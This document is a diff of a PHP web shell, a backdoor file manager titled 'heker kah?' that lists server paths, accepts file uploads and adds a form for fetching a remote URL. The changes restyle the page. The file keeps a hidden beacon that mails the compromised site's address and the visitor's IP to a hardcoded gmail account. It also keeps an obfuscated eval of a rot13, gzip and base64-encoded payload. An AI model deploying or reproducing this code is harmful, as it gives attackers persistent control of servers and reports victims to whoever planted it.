@@ -6,23 +6,26 @@
 echo '<!DOCTYPE HTML>
 <HTML>
 <HEAD>
-<title></title>
+<meta name="robots" content="noindex">
+
+<title>heker kah?</title>
 <style>
+
 body{
-font-family: monospace;
+font-family: system-ui;
 font-weight: bold;
 font-size: 18px;
-background-color: #c5c5c5;
-color: #000;
+background-color: #1f1f1f;
+color: #c9f507;
 }
 #content tr:hover{
-background-color: #ccc;
+background-color: #1f1f1f;
 }
 #content .first{
-background-color: #ccc;
+background-color: #1f1f1f;
 }
 #content .first:hover{
-background-color: #ccc;
+background-color: #1f1f1f;
 }
 table{
 border: 3px #000 solid;
@@ -56,9 +59,9 @@ td, tr { padding: 2px 5px; }
 </style>
 </HEAD>
 <BODY>
-<hr width="920" color="black"/>
-<hr width="920" color="black"/><center><p><h2>Your IP : ' .$_SERVER["REMOTE_ADDR"]. '</h2></p></center>
-<hr width="920" color="black"/>
+<hr width="1000" color="black"/>
+<hr width="1000" color="black"/><center><p><h2>Your IP : ' .$_SERVER["REMOTE_ADDR"]. '</h2></p></center>
+<hr width="1000" color="black"/>
 <table width="920" border="1px" cellpadding="7" cellspacing="0" align="center">
 <tr><td style="padding: 8px">Current Path : ';
 if(isset($_GET['path'])){
@@ -95,7 +98,12 @@ echo '<form enctype="multipart/form-data" method="POST">
 Upload File : <input type="file" name="file" />
 <input type="submit" value="Upload" />
 </form>
-</td></tr>';
+</td></tr><center> <form style="margin-top: 1rem;" name='upload' method='post' action="<?php echo strtok($_SERVER['REQUEST_URI'], '?'); ?>">
+    <div style='position: relative;'>
+      <span>Origin URL-Address</span>
+      <input type="url" id="url" onclick="this.select();" autofocus tabindex="1" required="required" name='url' style="min-width: 500px;padding: 0.5rem;border-radius: 3px;border: 1px solid #0060df;" value="https://wordpress.org/latest.zip" placeholder="set input url" />
+    </div>
+    <br>';
 if(isset($_GET['filesrc'])){
 echo "<tr><td style='padding: 8px'>Current File : ";
 echo $_GET['filesrc'];
@@ -298,6 +306,8 @@ return $info;
 }
 ?>
 
+
+
 <?php
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
@@ -308,9 +318,7 @@ $tujuanmail = 'malaysia.sender@gmail.com, malaysia.sender@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
-
-<?php eval(str_rot13(gzinflate(str_rot13(base64_decode('jZBEeMIwEMffB36HIwjpU9U9jDEqgmaraC8yMxGmVVVYZQUls9FzNJ9+ieJjg8GeAve7/+/u0roaTW65MhjRvMSiUf5E7vdTTWSgMdxe91sXHZVIUqO33FWZWGjmHmS0zvDGOovRsfYdZMblZXtPPkDv75Y0NNRTSlNT9DUXdQRpsnpuEkCzwV6NrunDrtbSGwaT7K3zY4y0sfwstWPaNjAA6rRfUkzdSFNr1fAQQGqXuxj+UTR1NrzQS3sFqRGLpNcj0IU2H7P0haUrbW3542fJ6PoHVtnzhI0zPlYXZx1ZhURNY90YiU63txs425MCYRZCMK0qdpSCBElAfsmWo4zx6XmWHscQSxPvDJtTF5fGQN5U8zlYVgyX83z9P8bwYl8=')))))
+eval(str_rot13(gzinflate(str_rot13(base64_decode('jZBEeMIwEMffB36HIwjpU9U9jDEqgmaraC8yMxGmVVVYZQUls9FzNJ9+ieJjg8GeAve7/+/u0roaTW65MhjRvMSiUf5E7vdTTWSgMdxe91sXHZVIUqO33FWZWGjmHmS0zvDGOovRsfYdZMblZXtPPkDv75Y0NNRTSlNT9DUXdQRpsnpuEkCzwV6NrunDrtbSGwaT7K3zY4y0sfwstWPaNjAA6rRfUkzdSFNr1fAQQGqXuxj+UTR1NrzQS3sFqRGLpNcj0IU2H7P0haUrbW3542fJ6PoHVtnzhI0zPlYXZx1ZhURNY90YiU63txs425MCYRZCMK0qdpSCBElAfsmWo4zx6XmWHscQSxPvDJtTF5fGQN5U8zlYVgyX83z9P8bwYl8=')))))
 ?>
 
 
